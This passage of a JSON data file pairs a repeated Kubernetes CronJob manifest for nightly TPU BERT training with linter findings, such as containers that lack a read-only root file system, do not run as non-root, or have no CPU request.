$(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "9097",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "9098",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "9099",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "9100",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "9101",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "9102",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "9103",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            